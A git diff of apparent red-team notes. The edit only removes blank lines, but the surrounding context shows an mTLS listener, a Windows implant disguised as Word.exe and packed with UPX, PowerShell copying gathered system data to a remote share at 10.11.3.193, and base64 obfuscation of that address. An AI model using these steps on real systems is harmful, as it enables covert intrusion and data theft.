@@ -43,8 +43,6 @@ mtls -L  10.11.3.193 -l 8080
 GOOS=windows GOARCH=amd64 go build -ldflags="-s -w"
 # Pack with upx
 upx Word.exe
-
-
 ```
 
 ```powershell
@@ -93,7 +91,6 @@ Write-Output $WinDStat >> C:\programdata\info.txt
 Write-Output $logMallProviders >> C:\programdata\info.txt
 Write-Output $logMISMAProvider >> C:\programdata\info.txt
 Copy-Item -Path "C:\programdata\info.txt" -Destination "\\10.11.3.193\Share"
-
 ```
 - https://www.ired.team/offensive-security/code-execution/powershell-constrained-language-mode-bypass
 - https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters
@@ -233,9 +230,7 @@ It did not work, obfuscation time.
 
 ```powershell
 $Encoded = [convert]::ToBase64String([System.Text.encoding]::Unicode.GetBytes())
-
-
-$gohere=[System.Text.Encoding]::Utf8.GetString([System.Convert]::FromBase64String('MQAwAC4AMQAxAC4AMwAuADEAOQAzADoAOAA0ADQAMwA='))
+$Encoding2=[System.Text.Encoding]::Utf8.GetString([System.Convert]::FromBase64String('MQAwAC4AMQAxAC4AMwAuADEAOQAzADoAOAA0ADQAMwA='))
 ```
 - from https://medium.com/@SecureTacticsTS/simple-but-effective-powershell-obfuscation-techniques-b38900d8f7dd
 
@@ -327,5 +322,4 @@ Function ConvertFrom-Base64($base64) {
 Function ConvertTo-Base64($plain) {
     return [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes($plain))
 }
-
 ```
